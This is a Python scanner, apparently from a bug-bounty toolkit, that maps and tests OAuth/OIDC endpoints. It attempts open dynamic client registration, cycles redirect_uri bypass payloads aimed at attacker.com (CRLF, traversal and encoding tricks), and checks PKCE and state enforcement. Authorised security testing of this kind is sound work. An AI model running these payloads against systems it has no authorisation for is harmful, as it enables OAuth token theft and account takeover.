#!/usr/bin/env python3
"""
zwanski-oauth-mapper.py
Map and test OAuth/OIDC attack surface for a target.
Run without args or with --menu for an interactive guided workflow.
"""

import argparse
import json
import sys
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional
try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    sys.exit("pip install requests")

REQUIRED_PYTHON_PACKAGES = ["requests"]
RECOMMENDED_PYTHON_VERSION = "3.8+"

# ─────────────────────────────────────────────
# Config
# ─────────────────────────────────────────────
OAUTH_DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/oauth/.well-known/openid-configuration",
    "/auth/.well-known/openid-configuration",
    "/auth/realms/master/.well-known/openid-configuration",
    "/oauth2/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/api/oauth/.well-known/openid-configuration",
]

AUTHORIZE_PATHS = [
    "/oauth/authorize",
    "/auth/oauth/authorize",
    "/oauth2/authorize",
    "/connect/authorize",
    "/auth/authorize",
    "/api/oauth/authorize",
    "/auth/realms/master/protocol/openid-connect/auth",
]

JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/oauth/jwks",
    "/oauth/.well-known/jwks.json",
    "/api/auth/keys",
    "/auth/realms/master/protocol/openid-connect/certs",
]

REGISTER_PATHS = [
    "/oauth/register",
    "/oauth/clients",
    "/api/oauth/clients",
    "/auth/realms/master/clients-registrations/openid-connect",
    "/connect/register",
]

REDIRECT_URI_PAYLOADS = [
    "https://attacker.com/callback",
    "{base}/callback?redirected=https://attacker.com",
    "{base}/callback/../../../attacker.com",
    "{base}/callback%0d%0aLocation:https://attacker.com",
    "{base}/callback%23.attacker.com",
    "{base}/callback%5c%5cattacker.com",
    "https://{host}.attacker.com/callback",
    "https://attacker.com%23.{host}/callback",
]

# ─────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────
@dataclass
class OAuthEndpoint:
    url: str
    status: int
    body: Optional[str] = None
    headers: dict = field(default_factory=dict)

@dataclass
class Finding:
    severity: str
    title: str
    url: str
    detail: str

# ─────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────
def probe(session, url, method="GET", json_data=None, timeout=10):
    try:
        resp = session.request(method, url, json=json_data, 
                               timeout=timeout, verify=False,
                               allow_redirects=False)
        return resp
    except Exception:
        return None

def banner(text):
    print(f"\n{'─'*60}")
    print(f"  {text}")
    print('─'*60)

def err(msg):
    """Print error and exit"""
    print(f"\n[-] Error: {msg}")
    sys.exit(1)

def finding(severity, title, url, detail):
    icons = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "INFO": "🔵"}
    icon = icons.get(severity, "●")
    print(f"\n{icon} [{severity}] {title}")
    print(f"   URL    : {url}")
    print(f"   Detail : {detail}")
    return Finding(severity, title, url, detail)

# ─────────────────────────────────────────────
# Interactive helpers
# ─────────────────────────────────────────────

def print_header():
    print("\n╔════════════════════════════════════════════════════════════════╗")
    print("║                  zwanski OAuth Attack Surface Mapper           ║")
    print("╠════════════════════════════════════════════════════════════════╝")
    print("║ A guided tool for discovering OAuth/OIDC attack surface issues. ║")
    print("╚════════════════════════════════════════════════════════════════╝\n")


def get_input(prompt_text, default=None):
    try:
        value = input(prompt_text).strip()
    except (EOFError, KeyboardInterrupt):
        return ""
    if not value and default is not None:
        return default
    return value


def create_session(token=None):
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "application/json, text/html, */*"
    })
    if token:
        session.headers["Authorization"] = f"Bearer {token}"
    return session


def display_findings(findings):
    if not findings:
        print("\n[ i ] No findings recorded yet.")
        return
    banner("FINDINGS")
    for f in findings:
        print(f"  [{f.severity}] {f.title} — {f.url}")


def show_requirements():
    banner("REQUIREMENTS")
    print(f"Python: {RECOMMENDED_PYTHON_VERSION} or newer")
    print("Required Python package:\n  pip3 install requests")
    print("\nRecommended: a working network connection and access to OAuth endpoints.")
    print("\nCLI mode: python3 zwanski-oauth-mapper.py --target https://target.com")
    print("Interactive mode: python3 zwanski-oauth-mapper.py --menu or no args")


def prompt_target():
    while True:
        target = get_input("Target URL (e.g. https://target.com): ")
        if target:
            return target.rstrip("/")
        print("Please enter a valid target URL.")


def prompt_token():
    token = get_input("Bearer token (optional, press Enter to skip): ")
    return token if token else None


def run_full_scan(session, base, findings):
    print(f"\nRunning full OAuth/OIDC scan against {base}")
    oidc_config = discover_oidc(session, base)
    discover_jwks(session, base)
    reg_result = test_dynamic_registration(session, base, findings)
    client_id = reg_result.get("client_id") if reg_result else None
    test_redirect_uri_bypass(session, base, findings, client_id)
    test_pkce_enforcement(session, base, findings, client_id)
    test_state_csrf(session, base, findings, client_id)
    return findings


def interactive_menu():
    print_header()
    base = prompt_target()
    token = prompt_token()
    session = create_session(token)
    findings = []
    client_id = None

    while True:
        print("\nSelect an option:")
        print(" 1) Run full OAuth/OIDC scan")
        print(" 2) Discover OIDC / OAuth configuration")
        print(" 3) Discover JWKS keys")
        print(" 4) Test dynamic client registration")
        print(" 5) Test redirect_uri bypass")
        print(" 6) Test PKCE enforcement")
        print(" 7) Test state parameter / CSRF handling")
        print(" 8) Show current findings")
        print(" 9) Show requirements and usage help")
        print("10) Change target / token")
        print(" 0) Exit")

        choice = get_input("Option: ")

        if choice == "0":
            print("Exiting. Stay safe and keep your tooling updated.")
            break
        if choice == "10":
            base = prompt_target()
            token = prompt_token()
            session = create_session(token)
            findings = []
            client_id = None
            continue
        if choice == "1":
            findings = run_full_scan(session, base, findings)
            display_findings(findings)
            save = get_input("Save findings to JSON file? [y/N]: ", default="n").lower()
            if save in ("y", "yes"):
                output = get_input("Output file path: ", default="findings.json")
                with open(output, "w") as fp:
                    json.dump([vars(f) for f in findings], fp, indent=2)
                print(f"[+] Findings written to {output}")
            continue
        if choice == "2":
            discover_oidc(session, base)
            continue
        if choice == "3":
            discover_jwks(session, base)
            continue
        if choice == "4":
            reg_result = test_dynamic_registration(session, base, findings)
            if reg_result:
                client_id = reg_result.get("client_id")
            continue
        if choice == "5":
            test_redirect_uri_bypass(session, base, findings, client_id)
            continue
        if choice == "6":
            test_pkce_enforcement(session, base, findings, client_id)
            continue
        if choice == "7":
            test_state_csrf(session, base, findings, client_id)
            continue
        if choice == "8":
            display_findings(findings)
            continue
        if choice == "9":
            show_requirements()
            continue

        print("Invalid option. Please select a number from the menu.")

# ─────────────────────────────────────────────
# Discovery
# ─────────────────────────────────────────────
def discover_oidc(session, base):
    banner("OIDC/OAuth Discovery")
    config = None
    for path in OAUTH_DISCOVERY_PATHS:
        url = base + path
        resp = probe(session, url)
        if resp and resp.status_code == 200:
            try:
                config = resp.json()
                print(f"[+] Found OIDC config: {url}")
                for key in ["authorization_endpoint", "token_endpoint", 
                            "registration_endpoint", "jwks_uri", "userinfo_endpoint"]:
                    if key in config:
                        print(f"    {key}: {config[key]}")
            except Exception:
                pass
    return config

def discover_jwks(session, base):
    banner("JWKS Discovery")
    for path in JWKS_PATHS:
        url = base + path
        resp = probe(session, url)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if "keys" in data:
                    print(f"[+] JWKS found: {url} ({len(data['keys'])} keys)")
                    for key in data["keys"]:
                        print(f"    alg={key.get('alg','?')} kty={key.get('kty','?')} use={key.get('use','?')}")
                    return data
            except Exception:
                pass
    return None

# ─────────────────────────────────────────────
# Tests
# ─────────────────────────────────────────────
def test_dynamic_registration(session, base, findings):
    banner("Testing Dynamic Client Registration")
    for path in REGISTER_PATHS:
        url = base + path
        payload = {
            "client_name": "test-client-recon",
            "redirect_uris": ["https://httpbin.org/get"],
            "grant_types": ["authorization_code"],
            "response_types": ["code"],
            "scope": "openid profile email"
        }
        resp = probe(session, url, method="POST", json_data=payload)
        if resp:
            print(f"[*] POST {url} → {resp.status_code}")
            if resp.status_code in [200, 201]:
                try:
                    data = resp.json()
                    if "client_id" in data:
                        f = finding("CRITICAL",
                            "Open Dynamic Client Registration",
                            url,
                            f"Unauthenticated client registration succeeded. "
                            f"client_id={data.get('client_id')} "
                            f"Attacker can register rogue OAuth clients with malicious redirect_uri.")
                        findings.append(f)
                        return data
                except Exception:
                    pass
            elif resp.status_code == 401:
                print(f"    → Auth required (expected)")
            elif resp.status_code == 403:
                print(f"    → Forbidden")
    return None

def test_redirect_uri_bypass(session, base, findings, client_id=None):
    banner("Testing redirect_uri Bypass Vectors")
    host = urllib.parse.urlparse(base).netloc
    test_redirect = "https://httpbin.org/get"  # use attacker server in real test

    for path in AUTHORIZE_PATHS:
        url = base + path
        resp = probe(session, url)
        if resp and resp.status_code in [200, 302, 400]:
            print(f"[+] Authorize endpoint found: {url}")
            for tpl in REDIRECT_URI_PAYLOADS:
                redirect = tpl.format(base=base, host=host)
                params = {
                    "response_type": "code",
                    "client_id": client_id or "test",
                    "redirect_uri": redirect,
                    "scope": "openid",
                    "state": "teststate123"
                }
                probe_url = url + "?" + urllib.parse.urlencode(params)
                r = probe(session, probe_url)
                if r and r.status_code == 302:
                    loc = r.headers.get("Location", "")
                    if "attacker.com" in loc or "httpbin.org" in loc:
                        f = finding("HIGH",
                            "redirect_uri Bypass — Open Redirect to Attacker",
                            probe_url,
                            f"Server redirected to attacker-controlled URI: {loc}")
                        findings.append(f)
            break

def test_pkce_enforcement(session, base, findings, client_id=None):
    banner("Testing PKCE Enforcement")
    for path in AUTHORIZE_PATHS:
        url = base + path
        # Request without code_challenge
        params = {
            "response_type": "code",
            "client_id": client_id or "test",
            "redirect_uri": base + "/callback",
            "scope": "openid",
            "state": "teststate456"
        }
        probe_url = url + "?" + urllib.parse.urlencode(params)
        r = probe(session, probe_url)
        if r:
            print(f"[*] PKCE test: {probe_url} → {r.status_code}")
            if r.status_code == 302 and "code=" in r.headers.get("Location", ""):
                f = finding("MEDIUM",
                    "PKCE Not Enforced",
                    url,
                    "Authorization code issued without code_challenge parameter. "
                    "PKCE is optional, enabling authorization code interception attacks.")
                findings.append(f)
            elif r.status_code in [400]:
                body = r.text.lower()
                if "code_challenge" in body or "pkce" in body:
                    print("    → PKCE enforced (good)")
                else:
                    print(f"    → 400 response (different validation)")
            break

def test_state_csrf(session, base, findings, client_id=None):
    banner("Testing state Parameter (CSRF)")
    for path in AUTHORIZE_PATHS:
        url = base + path
        # Request without state
        params = {
            "response_type": "code",
            "client_id": client_id or "test",
            "redirect_uri": base + "/callback",
            "scope": "openid"
            # intentionally no state
        }
        probe_url = url + "?" + urllib.parse.urlencode(params)
        r = probe(session, probe_url)
        if r and r.status_code not in [400, 422]:
            f = finding("MEDIUM",
                "Missing state Parameter Not Rejected",
                url,
                "Authorization request without state parameter was not rejected. "
                "If state is not enforced, CSRF attacks against the OAuth flow are possible.")
            findings.append(f)
        break

# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        prog="zwanski-oauth-mapper",
        description="zwanski OAuth Attack Surface Mapper — Discover and test OAuth/OIDC vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  Interactive mode (recommended):
    python3 zwanski-oauth-mapper.py
    
  Full automated scan:
    python3 zwanski-oauth-mapper.py --target https://target.com
    
  Authenticated scan with token:
    python3 zwanski-oauth-mapper.py --target https://target.com --token "YOUR_JWT_TOKEN"
    
  Export findings:
    python3 zwanski-oauth-mapper.py --target https://target.com --output findings.json

REQUIREMENTS:
  - Python 3.8+
  - requests library (pip3 install requests)
  - Network access to OAuth endpoints

FEATURES TESTED:
  - OIDC/OAuth configuration discovery
  - JWKS key enumeration
  - Dynamic client registration (open registration)
  - Redirect URI bypasses
  - PKCE enforcement
  - State parameter validation (CSRF)

For detailed usage, visit:
  https://github.com/zwanski2019/zwanski-Bug-Bounty
"""
    )
    
    parser.add_argument("--target", 
                       help="Target URL (e.g. https://target.com)")
    parser.add_argument("--token", 
                       help="Bearer token for authenticated testing")
    parser.add_argument("--output", 
                       help="Output JSON file for findings (e.g. findings.json)")
    parser.add_argument("--menu", 
                       action="store_true", 
                       help="Force interactive menu mode")
    
    args = parser.parse_args()

    if args.menu or len(sys.argv) == 1:
        interactive_menu()
        return

    if not args.target:
        parser.print_help()
        parser.error("--target is required (or use no args for interactive menu)")

    base = args.target.rstrip("/")
    if not base.startswith(("http://", "https://")):
        base = "https://" + base
    
    findings = []
    session = create_session(args.token)

    print_header()
    print(f"Target: {base}")
    print(f"Token provided: {'Yes' if args.token else 'No'}")
    print()

    try:
        # Run all tests
        oidc_config = discover_oidc(session, base)
        discover_jwks(session, base)
        
        reg_result = test_dynamic_registration(session, base, findings)
        client_id = reg_result.get("client_id") if reg_result else None
        
        test_redirect_uri_bypass(session, base, findings, client_id)
        test_pkce_enforcement(session, base, findings, client_id)
        test_state_csrf(session, base, findings, client_id)

        display_findings(findings)
    except KeyboardInterrupt:
        print("\n\n[*] Scan interrupted by user.")
        if findings:
            display_findings(findings)
        return
    except Exception as e:
        err(f"Error during scan: {e}")
        return

    if args.output:
        try:
            with open(args.output, "w") as fp:
                json.dump([vars(f) for f in findings], fp, indent=2)
            print(f"\n[+] Findings written to {args.output}")
        except IOError as e:
            print(f"\n[-] Could not write to {args.output}: {e}")

if __name__ == "__main__":
    main()
